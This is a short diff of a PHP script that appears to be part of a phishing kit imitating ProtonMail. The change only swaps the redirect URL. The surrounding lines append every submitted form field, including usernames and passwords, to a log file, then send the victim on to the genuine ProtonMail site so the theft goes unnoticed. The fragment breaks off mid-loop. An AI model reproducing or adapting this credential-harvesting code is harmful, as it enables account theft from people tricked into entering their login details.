@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://mail.protonmail.com/login');
+header ('Location: https://mail.protonmail.com/');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
